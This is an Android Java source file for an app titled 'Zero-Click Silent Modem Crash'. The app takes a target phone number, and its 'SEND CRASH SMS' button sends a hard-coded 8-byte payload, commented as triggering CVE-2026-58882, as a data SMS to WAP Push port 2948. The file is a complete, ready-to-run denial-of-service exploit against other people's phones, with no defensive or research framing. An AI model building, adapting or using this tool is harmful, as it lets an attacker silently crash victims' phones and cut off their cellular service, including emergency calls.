package com.markb.wappushcrash;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private EditText phoneNumberInput;
    private static final int SMS_PERMISSION_CODE = 101;

    // The exact hex payload that triggers CVE-2026-58882
    // 01 06 88 80 80 80 00 BE (Converted to bytes)
    private final byte[] maliciousPayload = new byte[]{
            (byte) 0x01, (byte) 0x06, (byte) 0x88, (byte) 0x80, 
            (byte) 0x80, (byte) 0x80, (byte) 0x00, (byte) 0xBE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Build UI Programmatically
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);

        TextView title = new TextView(this);
        title.setText("Zero-Click Silent Modem Crash\nTarget Number:");
        title.setTextSize(18f);
        layout.addView(title);

        phoneNumberInput = new EditText(this);
        phoneNumberInput.setHint("+1234567890");
        layout.addView(phoneNumberInput);

        Button sendButton = new Button(this);
        sendButton.setText("SEND CRASH SMS");
        sendButton.setOnClickListener(v -> {
            if (checkSmsPermission()) {
                executeAttack();
            } else {
                requestSmsPermission();
            }
        });
        layout.addView(sendButton);

        setContentView(layout);
    }

    private void executeAttack() {
        String targetNumber = phoneNumberInput.getText().toString().trim();
        if (targetNumber.isEmpty()) {
            Toast.makeText(this, "Enter a target number", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            SmsManager smsManager = SmsManager.getDefault();
            
            // Send to WAP Push Port 2948
            short destPort = 2948;
            
            smsManager.sendDataMessage(
                    targetNumber,
                    null, // Service Center Address (null = default)
                    destPort,
                    maliciousPayload,
                    null, // SentIntent
                    null  // DeliveryIntent
            );
            
            Toast.makeText(this, "Payload Sent.", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
                == PackageManager.PERMISSION_GRANTED;
    }

    private void requestSmsPermission() {
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.SEND_SMS},
                SMS_PERMISSION_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Permission Denied. Cannot send payload.", Toast.LENGTH_LONG).show();
            }
        }
    }
}
